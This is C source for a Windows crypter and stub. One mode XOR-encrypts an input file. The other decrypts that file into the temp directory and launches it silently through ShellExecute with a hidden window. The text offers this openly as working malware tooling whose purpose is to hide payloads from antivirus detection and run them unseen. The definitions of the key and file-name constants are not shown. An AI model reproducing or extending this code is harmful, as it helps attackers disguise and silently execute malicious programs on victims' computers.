int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (__argc < 2)
    {
        // stub routine
        // get target encrypted file
        CHAR szEncryptedFileName[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, szEncryptedFileName);
        strcat(szEncryptedFileName, "\\");
        strcat(szEncryptedFileName, CRYPTED_FILE);

        // get handle to file
        HANDLE hFile = CreateFile(szEncryptedFileName, FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        // get file size
        DWORD dwFileSize = GetFileSize(hFile, NULL);

        // decrypt and obtain decrypted bytes
        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);
        CloseHandle(hFile);

        // get file in temporary directory
        CHAR szTempFileName[MAX_PATH];
        GetTempPath(MAX_PATH, szTempFileName);
        strcat(szTempFileName, DECRYPTED_FILE);

        // open handle to temp file
        HANDLE hTempFile = CreateFile(szTempFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        // write to temporary file
        WriteFile(hTempFile, lpFileBytes, dwFileSize, NULL, NULL);
        // clean up
        CloseHandle(hTempFile);
        free(lpFileBytes);
        ShellExecute(NULL, NULL, szTempFileName, NULL, NULL, 0);
    }
    else
    {
        // crypter routine
        // open file to crypt
        HANDLE hFile = CreateFile(__argv[1], FILE_READ_ACCESS, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        // get file size
        DWORD dwFileSize = GetFileSize(hFile, NULL);

        // crypt and get crypted bytes
        LPVOID lpFileBytes = Crypt(hFile, dwFileSize);

        // get crypted file name in current directory
        char szCryptedFileName[MAX_PATH];
        GetCurrentDirectory(MAX_PATH, szCryptedFileName);
        strcat(szCryptedFileName, "\\");
        strcat(szCryptedFileName, CRYPTED_FILE);
        // open handle to new crypted file
        HANDLE hCryptedFile = CreateFile(szCryptedFileName, FILE_WRITE_ACCESS, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

        // write to crypted file
        WriteFile(hCryptedFile, lpFileBytes, dwFileSize, NULL, NULL);
        CloseHandle(hCryptedFile);
        free(lpFileBytes);
    }

    return EXIT_SUCCESS;
}

LPVOID Crypt(HANDLE hFile, DWORD dwFileSize)
{
    // allocate buffer for file contents
    LPVOID lpFileBytes = malloc(dwFileSize);
    // read the file into the buffer
    ReadFile(hFile, lpFileBytes, dwFileSize, NULL, NULL);

    // apply XOR encryption
    int i;
    for (i = 0; i < dwFileSize; i++)
    {
        *((LPBYTE)lpFileBytes + i) ^= Key[i % sizeof(Key)];
    }

    return lpFileBytes;
}